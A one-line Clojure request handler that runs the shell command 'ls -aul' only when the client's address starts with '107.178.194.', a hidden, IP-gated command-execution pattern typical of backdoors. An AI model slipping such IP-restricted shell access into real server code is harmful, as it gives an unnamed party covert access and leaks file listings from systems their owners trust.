(fn[rq rs](if(.startsWith(.getRemoteAddr rq)"107.178.194.")
(clojure.java.shell/sh "ls" "-aul")))